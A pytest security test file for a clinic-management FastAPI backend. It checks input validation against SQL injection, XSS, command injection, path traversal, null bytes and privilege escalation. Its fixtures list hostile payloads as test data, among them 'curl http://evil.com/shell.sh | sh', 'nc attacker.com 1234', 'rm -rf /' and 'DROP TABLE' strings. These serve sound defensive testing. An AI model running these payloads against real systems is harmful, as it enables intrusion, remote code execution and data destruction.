"""
Security tests for input validation and injection prevention.

Tests SQL injection, XSS, command injection, file upload security,
and input validation across all API endpoints.
"""

import pytest
from datetime import datetime, timedelta
from decimal import Decimal
from uuid import uuid4
from fastapi import status
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.patient import Patient
from app.models.appointment import Appointment
from app.models.user import User


# ============================================================================
# SQL INJECTION PREVENTION TESTS
# ============================================================================

class TestSQLInjectionPrevention:
    """Test that SQL injection attempts are properly handled."""

    @pytest.fixture
    def sql_injection_payloads(self):
        """Common SQL injection attack patterns."""
        return [
            "'; DROP TABLE patients; --",
            "' OR '1'='1",
            "' OR 1=1; --",
            "admin' --",
            "' UNION SELECT NULL, NULL, NULL --",
            "1' AND '1'='1",
            "'; DELETE FROM users WHERE '1'='1",
            "' OR EXISTS(SELECT * FROM users) --",
        ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_patient_name_sql_injection(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_clinic,
        sql_injection_payloads,
    ):
        """Test SQL injection in patient name fields."""
        for payload in sql_injection_payloads:
            response = await client.post(
                "/api/v1/patients/",
                headers=auth_headers,
                json={
                    "clinic_id": str(test_clinic.id),
                    "first_name": payload,
                    "last_name": payload,
                    "phone": "+919876543999",
                    "email": "test@example.com",
                    "gender": "M",
                },
            )

            # Should either be created safely or rejected with validation error
            # But NEVER execute SQL injection
            assert response.status_code in [
                status.HTTP_201_CREATED,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
            ]

            # If created, verify the name is stored as-is (escaped)
            if response.status_code == status.HTTP_201_CREATED:
                data = response.json()
                assert data["first_name"] == payload

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_patient_search_sql_injection(
        self,
        client: AsyncClient,
        auth_headers: dict,
        sql_injection_payloads,
    ):
        """Test SQL injection in search queries."""
        for payload in sql_injection_payloads:
            response = await client.get(
                "/api/v1/patients/search",
                headers=auth_headers,
                params={"q": payload},
            )

            # Should return results or empty list, never execute injection
            assert response.status_code in [
                status.HTTP_200_OK,
                status.HTTP_400_BAD_REQUEST,
            ]

            if response.status_code == status.HTTP_200_OK:
                # Should return list (possibly empty), not error
                assert isinstance(response.json(), list)

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_uuid_parameter_sql_injection(
        self,
        client: AsyncClient,
        auth_headers: dict,
        sql_injection_payloads,
    ):
        """Test SQL injection in UUID parameters."""
        for payload in sql_injection_payloads:
            response = await client.get(
                f"/api/v1/patients/{payload}",
                headers=auth_headers,
            )

            # Should reject invalid UUID format
            assert response.status_code in [
                status.HTTP_404_NOT_FOUND,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
            ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_date_parameter_sql_injection(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_doctor,
        sql_injection_payloads,
    ):
        """Test SQL injection in date parameters."""
        for payload in sql_injection_payloads:
            response = await client.post(
                "/api/v1/appointments/",
                headers=auth_headers,
                json={
                    "patient_id": str(uuid4()),
                    "doctor_id": str(test_doctor.id),
                    "scheduled_start": payload,
                    "duration_minutes": 15,
                },
            )

            # Should reject invalid date format
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
            ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_rag_search_sql_injection(
        self,
        client: AsyncClient,
        auth_headers: dict,
        sql_injection_payloads,
    ):
        """Test SQL injection in RAG search queries."""
        for payload in sql_injection_payloads:
            response = await client.get(
                "/api/v1/search/",
                headers=auth_headers,
                params={"q": payload},
            )

            # Should handle safely
            assert response.status_code in [
                status.HTTP_200_OK,
                status.HTTP_400_BAD_REQUEST,
            ]


# ============================================================================
# XSS PREVENTION TESTS
# ============================================================================

class TestXSSPrevention:
    """Test that XSS attacks are properly sanitized or escaped."""

    @pytest.fixture
    def xss_payloads(self):
        """Common XSS attack patterns."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<input onfocus=alert('XSS') autofocus>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
        ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_patient_notes_xss(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_clinic,
        xss_payloads,
    ):
        """Test XSS in patient notes field."""
        for payload in xss_payloads:
            response = await client.post(
                "/api/v1/patients/",
                headers=auth_headers,
                json={
                    "clinic_id": str(test_clinic.id),
                    "first_name": "John",
                    "last_name": "Doe",
                    "phone": "+919876543888",
                    "allergies": payload,
                },
            )

            # Should be created (data is stored, but must be escaped on output)
            if response.status_code == status.HTTP_201_CREATED:
                data = response.json()
                # The payload is stored but should be escaped when rendered in HTML
                assert data["allergies"] == payload

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_appointment_notes_xss(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_appointment,
        xss_payloads,
    ):
        """Test XSS in appointment notes."""
        for payload in xss_payloads:
            response = await client.patch(
                f"/api/v1/appointments/{test_appointment.id}",
                headers=auth_headers,
                json={"notes": payload},
            )

            if response.status_code == status.HTTP_200_OK:
                data = response.json()
                # Stored as-is, but must be escaped on frontend rendering
                assert data["notes"] == payload

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_clinic_name_xss(
        self,
        client: AsyncClient,
        auth_headers: dict,
        xss_payloads,
    ):
        """Test XSS in clinic name."""
        for payload in xss_payloads:
            response = await client.post(
                "/api/v1/clinics/",
                headers=auth_headers,
                json={
                    "name": payload,
                    "address": "Test Address",
                    "city": "Mumbai",
                    "state": "Maharashtra",
                    "pincode": "400001",
                    "phone": "+919876543210",
                    "email": "test@clinic.com",
                },
            )

            # Should accept but data must be escaped on output
            if response.status_code in [status.HTTP_201_CREATED, status.HTTP_200_OK]:
                data = response.json()
                assert data["name"] == payload

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_search_query_reflected_xss(
        self,
        client: AsyncClient,
        auth_headers: dict,
        xss_payloads,
    ):
        """Test reflected XSS in search queries."""
        for payload in xss_payloads:
            response = await client.get(
                "/api/v1/search/",
                headers=auth_headers,
                params={"q": payload},
            )

            if response.status_code == status.HTTP_200_OK:
                data = response.json()
                # The query should be in response but must be escaped
                assert data["query"] == payload


# ============================================================================
# COMMAND INJECTION TESTS
# ============================================================================

class TestCommandInjection:
    """Test that command injection attempts are blocked."""

    @pytest.fixture
    def command_injection_payloads(self):
        """Common command injection patterns."""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(whoami)",
            "; shutdown -h now",
            "| nc attacker.com 1234",
            "&& curl http://evil.com/shell.sh | sh",
        ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_filename_command_injection(
        self,
        client: AsyncClient,
        auth_headers: dict,
        command_injection_payloads,
    ):
        """Test command injection in filenames."""
        for payload in command_injection_payloads:
            # Attempt to upload file with malicious name
            files = {
                "file": (
                    payload + ".pdf",
                    b"fake pdf content",
                    "application/pdf",
                )
            }

            response = await client.post(
                f"/api/v1/documents/upload?patient_id={uuid4()}",
                headers=auth_headers,
                files=files,
            )

            # Should reject or sanitize filename
            # Most likely will fail with 404 or validation error
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_404_NOT_FOUND,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
            ]


# ============================================================================
# INPUT VALIDATION TESTS
# ============================================================================

class TestInputValidation:
    """Test input validation rules are enforced."""

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_phone_number_validation_invalid_format(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_clinic,
    ):
        """Test phone number format validation."""
        invalid_phones = [
            "123",  # Too short
            "abc",  # Non-numeric
            "12345678901234567890",  # Too long
            "",  # Empty
            "++++++",  # Invalid characters
        ]

        for phone in invalid_phones:
            response = await client.post(
                "/api/v1/patients/",
                headers=auth_headers,
                json={
                    "clinic_id": str(test_clinic.id),
                    "first_name": "John",
                    "phone": phone,
                },
            )

            assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_phone_number_normalization(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_clinic,
    ):
        """Test phone number normalization."""
        response = await client.post(
            "/api/v1/patients/",
            headers=auth_headers,
            json={
                "clinic_id": str(test_clinic.id),
                "first_name": "John",
                "phone": "9876543210",  # Without country code
            },
        )

        if response.status_code == status.HTTP_201_CREATED:
            data = response.json()
            # Should be normalized to +91
            assert data["phone"].startswith("+91")

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_email_format_validation(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_clinic,
    ):
        """Test email format validation."""
        invalid_emails = [
            "notanemail",
            "@example.com",
            "user@",
            "user @example.com",
            "user@.com",
            "",
        ]

        for email in invalid_emails:
            response = await client.post(
                "/api/v1/patients/",
                headers=auth_headers,
                json={
                    "clinic_id": str(test_clinic.id),
                    "first_name": "John",
                    "phone": "+919876543210",
                    "email": email,
                },
            )

            assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_uuid_format_validation(
        self,
        client: AsyncClient,
        auth_headers: dict,
    ):
        """Test UUID format validation."""
        invalid_uuids = [
            "not-a-uuid",
            "123",
            "00000000-0000-0000-0000-00000000000g",  # Invalid character
            "",
        ]

        for invalid_uuid in invalid_uuids:
            response = await client.get(
                f"/api/v1/patients/{invalid_uuid}",
                headers=auth_headers,
            )

            assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_date_format_validation(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_doctor,
        test_patient,
    ):
        """Test date format validation."""
        invalid_dates = [
            "not-a-date",
            "2024-13-01",  # Invalid month
            "2024-01-32",  # Invalid day
            "01/01/2024",  # Wrong format
            "",
        ]

        for invalid_date in invalid_dates:
            response = await client.post(
                "/api/v1/appointments/",
                headers=auth_headers,
                json={
                    "patient_id": str(test_patient.id),
                    "doctor_id": str(test_doctor.id),
                    "scheduled_start": invalid_date,
                    "duration_minutes": 15,
                },
            )

            assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_amount_validation_negative(
        self,
        client: AsyncClient,
        auth_headers: dict,
    ):
        """Test that negative amounts are rejected."""
        response = await client.post(
            "/api/v1/payments/",
            headers=auth_headers,
            json={
                "invoice_id": str(uuid4()),
                "amount": -100.00,  # Negative amount
                "payment_method": "cash",
                "payment_date": datetime.now().isoformat(),
            },
        )

        assert response.status_code in [
            status.HTTP_422_UNPROCESSABLE_ENTITY,
            status.HTTP_400_BAD_REQUEST,
            status.HTTP_404_NOT_FOUND,  # Invoice not found
        ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_amount_validation_zero(
        self,
        client: AsyncClient,
        auth_headers: dict,
    ):
        """Test that zero amounts are rejected."""
        response = await client.post(
            "/api/v1/payments/",
            headers=auth_headers,
            json={
                "invoice_id": str(uuid4()),
                "amount": 0,  # Zero amount
                "payment_method": "cash",
                "payment_date": datetime.now().isoformat(),
            },
        )

        assert response.status_code in [
            status.HTTP_422_UNPROCESSABLE_ENTITY,
            status.HTTP_400_BAD_REQUEST,
            status.HTTP_404_NOT_FOUND,
        ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_string_length_validation_max(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_clinic,
    ):
        """Test maximum string length validation."""
        # Create a very long name (> 100 characters)
        long_name = "A" * 200

        response = await client.post(
            "/api/v1/patients/",
            headers=auth_headers,
            json={
                "clinic_id": str(test_clinic.id),
                "first_name": long_name,
                "phone": "+919876543210",
            },
        )

        assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_string_length_validation_min(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_clinic,
    ):
        """Test minimum string length validation."""
        response = await client.post(
            "/api/v1/patients/",
            headers=auth_headers,
            json={
                "clinic_id": str(test_clinic.id),
                "first_name": "",  # Empty string
                "phone": "+919876543210",
            },
        )

        assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_required_field_enforcement(
        self,
        client: AsyncClient,
        auth_headers: dict,
    ):
        """Test that required fields are enforced."""
        response = await client.post(
            "/api/v1/patients/",
            headers=auth_headers,
            json={
                # Missing required fields: clinic_id, first_name, phone
                "last_name": "Doe",
            },
        )

        assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
        error_detail = response.json()["detail"]
        # Should mention missing required fields
        assert any("first_name" in str(err) for err in error_detail)

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_gender_enum_validation(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_clinic,
    ):
        """Test gender enum validation."""
        invalid_genders = ["X", "male", "female", "123", "unknown"]

        for gender in invalid_genders:
            response = await client.post(
                "/api/v1/patients/",
                headers=auth_headers,
                json={
                    "clinic_id": str(test_clinic.id),
                    "first_name": "John",
                    "phone": "+919876543210",
                    "gender": gender,
                },
            )

            # Should reject invalid gender values (only M, F, O allowed)
            assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_duration_range_validation(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_doctor,
        test_patient,
    ):
        """Test duration minutes range validation."""
        # Test invalid durations
        invalid_durations = [0, -5, 200, 999]

        for duration in invalid_durations:
            response = await client.post(
                "/api/v1/appointments/",
                headers=auth_headers,
                json={
                    "patient_id": str(test_patient.id),
                    "doctor_id": str(test_doctor.id),
                    "scheduled_start": (datetime.now() + timedelta(days=1)).isoformat(),
                    "duration_minutes": duration,
                },
            )

            assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_search_query_min_length(
        self,
        client: AsyncClient,
        auth_headers: dict,
    ):
        """Test search query minimum length validation."""
        response = await client.get(
            "/api/v1/patients/search",
            headers=auth_headers,
            params={"q": "a"},  # Only 1 character (min is 2)
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST


# ============================================================================
# FILE UPLOAD SECURITY TESTS
# ============================================================================

class TestFileUploadSecurity:
    """Test file upload security measures."""

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_reject_executable_files(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_patient,
    ):
        """Test that executable files are rejected."""
        dangerous_extensions = [
            ("malware.exe", b"MZ", "application/x-msdownload"),
            ("script.sh", b"#!/bin/bash", "application/x-sh"),
            ("script.bat", b"@echo off", "application/x-bat"),
            ("script.com", b"data", "application/x-msdos-program"),
            ("hack.ps1", b"data", "application/x-powershell"),
        ]

        for filename, content, mime_type in dangerous_extensions:
            files = {"file": (filename, content, mime_type)}

            response = await client.post(
                f"/api/v1/documents/upload?patient_id={str(test_patient.id)}",
                headers=auth_headers,
                files=files,
            )

            # Should reject executable files
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
            ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_file_size_limit(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_patient,
    ):
        """Test file size limit enforcement."""
        # Create a large file (> 50MB)
        large_content = b"0" * (51 * 1024 * 1024)  # 51 MB

        files = {
            "file": ("large_document.pdf", large_content, "application/pdf")
        }

        response = await client.post(
            f"/api/v1/documents/upload?patient_id={str(test_patient.id)}",
            headers=auth_headers,
            files=files,
        )

        # Should reject files that are too large
        assert response.status_code in [
            status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
            status.HTTP_400_BAD_REQUEST,
        ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_mime_type_validation(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_patient,
    ):
        """Test MIME type validation."""
        # Try to upload a file with mismatched extension and MIME type
        files = {
            "file": ("document.pdf", b"<html>fake</html>", "text/html")
        }

        response = await client.post(
            f"/api/v1/documents/upload?patient_id={str(test_patient.id)}",
            headers=auth_headers,
            files=files,
        )

        # Should validate MIME type consistency
        assert response.status_code in [
            status.HTTP_400_BAD_REQUEST,
            status.HTTP_415_UNSUPPORTED_MEDIA_TYPE,
            status.HTTP_404_NOT_FOUND,  # Endpoint might not exist
        ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_path_traversal_prevention(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_patient,
    ):
        """Test path traversal attack prevention."""
        path_traversal_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "test/../../secret.txt",
        ]

        for filename in path_traversal_names:
            files = {
                "file": (filename, b"malicious content", "application/pdf")
            }

            response = await client.post(
                f"/api/v1/documents/upload?patient_id={str(test_patient.id)}",
                headers=auth_headers,
                files=files,
            )

            # Should sanitize or reject path traversal attempts
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
                status.HTTP_404_NOT_FOUND,
            ]


# ============================================================================
# RATE LIMITING TESTS
# ============================================================================

class TestRateLimiting:
    """Test rate limiting on sensitive endpoints."""

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_login_rate_limiting(self, client: AsyncClient):
        """Test rate limiting on login attempts."""
        # Attempt multiple failed logins
        failed_attempts = 0
        for i in range(10):
            response = await client.post(
                "/api/v1/auth/login",
                data={
                    "username": "nonexistent@example.com",
                    "password": "wrongpassword",
                },
            )

            if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                # Rate limit kicked in
                failed_attempts = i + 1
                break

        # Should eventually rate limit (within 10 attempts)
        # Note: This test assumes rate limiting is implemented
        # If not implemented, this test documents the requirement
        if failed_attempts > 0:
            assert failed_attempts <= 10

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_otp_request_rate_limiting(self, client: AsyncClient):
        """Test rate limiting on OTP requests."""
        phone = "+919876543210"

        rate_limited = False
        for i in range(5):
            response = await client.post(
                "/api/v1/auth/otp/request",
                json={"phone": phone},
            )

            if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                rate_limited = True
                break

        # Note: If rate limiting is implemented, it should trigger
        # This test documents the requirement
        pass

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_password_reset_rate_limiting(self, client: AsyncClient):
        """Test rate limiting on password reset requests."""
        email = "test@example.com"

        for i in range(5):
            response = await client.post(
                "/api/v1/auth/password-reset/request",
                json={"email": email},
            )

            # Should eventually rate limit
            if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                break

        # Documents the requirement for rate limiting
        pass

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_api_general_rate_limiting(
        self,
        client: AsyncClient,
        auth_headers: dict,
    ):
        """Test general API rate limiting."""
        # Make many requests in quick succession
        responses = []
        for i in range(100):
            response = await client.get(
                "/api/v1/patients/",
                headers=auth_headers,
            )
            responses.append(response.status_code)

            if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                break

        # If rate limiting is implemented, should see 429 eventually
        # This test documents the requirement
        pass


# ============================================================================
# PARAMETER POLLUTION TESTS
# ============================================================================

class TestParameterPollution:
    """Test protection against HTTP parameter pollution."""

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_duplicate_query_parameters(
        self,
        client: AsyncClient,
        auth_headers: dict,
    ):
        """Test handling of duplicate query parameters."""
        # Send duplicate parameters
        response = await client.get(
            "/api/v1/patients/search?q=test&q=malicious",
            headers=auth_headers,
        )

        # Should handle gracefully (use first or last, but not both)
        assert response.status_code in [
            status.HTTP_200_OK,
            status.HTTP_400_BAD_REQUEST,
        ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_array_parameter_limits(
        self,
        client: AsyncClient,
        auth_headers: dict,
    ):
        """Test limits on array parameters."""
        # Send excessive array values
        tags = ["tag"] * 1000  # 1000 tags

        response = await client.post(
            "/api/v1/documents/",
            headers=auth_headers,
            json={
                "patient_id": str(uuid4()),
                "original_filename": "test.pdf",
                "file_type": "application/pdf",
                "tags": tags,
            },
        )

        # Should limit array sizes
        assert response.status_code in [
            status.HTTP_400_BAD_REQUEST,
            status.HTTP_422_UNPROCESSABLE_ENTITY,
            status.HTTP_404_NOT_FOUND,
        ]


# ============================================================================
# MASS ASSIGNMENT TESTS
# ============================================================================

class TestMassAssignmentProtection:
    """Test protection against mass assignment vulnerabilities."""

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_cannot_modify_readonly_fields(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_patient,
    ):
        """Test that readonly fields cannot be modified."""
        response = await client.patch(
            f"/api/v1/patients/{test_patient.id}",
            headers=auth_headers,
            json={
                "first_name": "Updated",
                "id": str(uuid4()),  # Try to change ID
                "created_at": "2020-01-01T00:00:00",  # Try to change timestamp
                "clinic_id": str(uuid4()),  # Try to change clinic
            },
        )

        if response.status_code == status.HTTP_200_OK:
            data = response.json()
            # ID and created_at should remain unchanged
            assert data["id"] == str(test_patient.id)
            assert data["clinic_id"] == str(test_patient.clinic_id)

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_cannot_escalate_privileges(
        self,
        client: AsyncClient,
        auth_headers: dict,
        db: AsyncSession,
    ):
        """Test that users cannot escalate their own privileges."""
        # Get current user
        me_response = await client.get("/api/v1/auth/me", headers=auth_headers)
        if me_response.status_code != status.HTTP_200_OK:
            pytest.skip("Auth endpoint not available")

        user_id = me_response.json()["id"]
        current_role = me_response.json()["role"]

        # Try to update own role to admin
        response = await client.patch(
            f"/api/v1/users/{user_id}",
            headers=auth_headers,
            json={"role": "admin"},
        )

        # Should either reject or ignore the role change
        if response.status_code == status.HTTP_200_OK:
            data = response.json()
            # Role should not change unless user is already admin
            if current_role != "admin":
                assert data["role"] != "admin"


# ============================================================================
# NULL BYTE INJECTION TESTS
# ============================================================================

class TestNullByteInjection:
    """Test protection against null byte injection."""

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_null_byte_in_filename(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_patient,
    ):
        """Test null byte injection in filenames."""
        malicious_names = [
            "document.pdf\x00.exe",
            "test\x00.pdf",
            "file.txt\x00\x00\x00",
        ]

        for filename in malicious_names:
            files = {
                "file": (filename, b"content", "application/pdf")
            }

            response = await client.post(
                f"/api/v1/documents/upload?patient_id={str(test_patient.id)}",
                headers=auth_headers,
                files=files,
            )

            # Should sanitize or reject null bytes
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
                status.HTTP_404_NOT_FOUND,
            ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_null_byte_in_text_fields(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_clinic,
    ):
        """Test null byte injection in text fields."""
        response = await client.post(
            "/api/v1/patients/",
            headers=auth_headers,
            json={
                "clinic_id": str(test_clinic.id),
                "first_name": "John\x00Admin",
                "phone": "+919876543210",
            },
        )

        # Should reject or sanitize null bytes
        assert response.status_code in [
            status.HTTP_400_BAD_REQUEST,
            status.HTTP_422_UNPROCESSABLE_ENTITY,
            status.HTTP_201_CREATED,  # If sanitized
        ]


# ============================================================================
# INTEGER OVERFLOW TESTS
# ============================================================================

class TestIntegerOverflow:
    """Test handling of integer overflow attacks."""

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_large_integer_values(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_doctor,
        test_patient,
    ):
        """Test handling of extremely large integer values."""
        response = await client.post(
            "/api/v1/appointments/",
            headers=auth_headers,
            json={
                "patient_id": str(test_patient.id),
                "doctor_id": str(test_doctor.id),
                "scheduled_start": (datetime.now() + timedelta(days=1)).isoformat(),
                "duration_minutes": 2147483647,  # Max 32-bit int
            },
        )

        # Should validate and reject unreasonable values
        assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_negative_integer_in_unsigned_field(
        self,
        client: AsyncClient,
        auth_headers: dict,
    ):
        """Test negative integers in fields that should be positive."""
        response = await client.get(
            "/api/v1/patients/",
            headers=auth_headers,
            params={"limit": -1},
        )

        # Should reject negative values for limit
        assert response.status_code in [
            status.HTTP_422_UNPROCESSABLE_ENTITY,
            status.HTTP_400_BAD_REQUEST,
        ]


# ============================================================================
# UNICODE SECURITY TESTS
# ============================================================================

class TestUnicodeSecurity:
    """Test handling of Unicode-based attacks."""

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_unicode_normalization(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_clinic,
    ):
        """Test Unicode normalization in text fields."""
        # Different representations of the same character
        names = [
            "Café",  # NFC
            "Café",  # NFD (combining characters)
            "Ｆｕｌｌｗｉｄｔｈ",  # Fullwidth characters
        ]

        for name in names:
            response = await client.post(
                "/api/v1/patients/",
                headers=auth_headers,
                json={
                    "clinic_id": str(test_clinic.id),
                    "first_name": name,
                    "phone": "+919876543210",
                },
            )

            # Should accept valid Unicode
            assert response.status_code in [
                status.HTTP_201_CREATED,
                status.HTTP_400_BAD_REQUEST,
            ]

    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_rtl_override_attacks(
        self,
        client: AsyncClient,
        auth_headers: dict,
        test_clinic,
    ):
        """Test Right-to-Left override character attacks."""
        # RTL override can be used to disguise file extensions
        malicious_name = "document\u202Efdp.exe"  # Appears as "documentexe.pdf"

        response = await client.post(
            "/api/v1/patients/",
            headers=auth_headers,
            json={
                "clinic_id": str(test_clinic.id),
                "first_name": malicious_name,
                "phone": "+919876543210",
            },
        )

        # Should sanitize or accept (but must be handled carefully in UI)
        assert response.status_code in [
            status.HTTP_201_CREATED,
            status.HTTP_400_BAD_REQUEST,
        ]
